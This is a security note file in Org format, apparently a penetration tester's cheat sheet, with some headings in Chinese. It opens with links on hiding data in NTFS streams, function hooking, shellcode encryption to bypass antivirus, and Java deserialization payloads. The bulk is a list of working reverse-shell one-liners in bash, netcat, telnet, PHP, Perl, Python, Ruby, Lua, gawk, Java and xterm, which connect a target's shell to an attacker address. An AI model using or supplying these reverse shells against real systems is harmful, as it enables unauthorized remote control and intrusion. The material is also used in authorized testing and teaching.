** 数据隐藏
   - [[https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html][NTFS 交换数据流]]
   - [[https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/][Data Streams]]
*** KeePass 安全机制
 - https://keepass.info/help/base/security.html
** Hook
   - Detours: https://github.com/microsoft/Detours/wiki
   - inline hook lib: https://bbs.pediy.com/thread-225863.htm
   - linux elf hook *demo*: https://bbs.pediy.com/thread-178320.htm
   - [[https://blog.netspi.com/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/][hook .so]]
   - [[http://www-personal.umich.edu/~zhaoyich/blog/2013/07/linux-api-hooking.html][api hook]]
** shellcode
   - 加密过杀软：https://xz.aliyun.com/t/6995
   - [[https://3gstudent.github.io/3gstudent.github.io/Shellcode%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Donut%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/][3gstudent shellcode 生成工具]]
** Java
   - 反序列化代码执行：http://www.jackson-t.ca/runtime-exec-payloads.html
** reverse shell
*** bash
bash -i >& /dev/tcp/ip/port 0>&1
*** nc
nc -e /bin/bash 192.168.1.146 7777
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
*** telnet
    #+begin_src sh
    telnet mknod backpipe p && telnet attackerip 8080 0<backpipe | \
    /bin/bash 1>backpipe
    #+end_src
*** php
php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.1.146/7777");'
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
*** perl
    #+begin_src sh
    perl -e 'use Socket;$i="10.0.0.1";$p=1234;
    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
    open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    #+end_src
*** python
    #+begin_src sh
    python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,
              socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);
              os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
              p=subprocess.call(['/bin/bash','-i']);"
    python -c "exec(\"import socket, subprocess;s=socket.socket();
              s.connect(('127.0.0.1',9000))\n
              while 1:  proc = subprocess.Popen(s.recv(1024), shell=True,
              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
              stdin=subprocess.PIPE);
              s.send(proc.stdout.read()+proc.stderr.read())\")"
    python -c "exec(shellcode.encode('base64').decode('base64'))"
    #+end_src
*** ruby
    #+begin_src sh
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;
            exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    #+end_src
*** lua
    #+begin_src sh
    lua -e "require('socket');require('os');t=socket.tcp();
    t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
    #+end_src
*** awk
#+begin_src awk
  #!/usr/bin/gawk -f
  BEGIN {
      Port    =  8080
      Prompt  =  "bkd> "
      Service = "/inet/tcp/" Port "/0/0"
      while (1) {
          do {
              printf Prompt |& Service
              Service |& getline cmd
              if (cmd) {
                  while ((cmd |& getline) > 0)
                      print $0 |& Service
                  close(cmd)
              }
          } while (cmd != "exit")
          close(Service)
      }
  }
#+end_src
*** misc

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

[Untested submission from anonymous reader]
xterm
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):

xhost +targetip

Further Reading

Also check out Bernardo’s Reverse Shell One-Liners.  He has some alternative approaches and doesn’t rely on /bin/sh for his Ruby reverse shell.

There’s a reverse shell written in gawk over here.  Gawk is not something that I’ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.
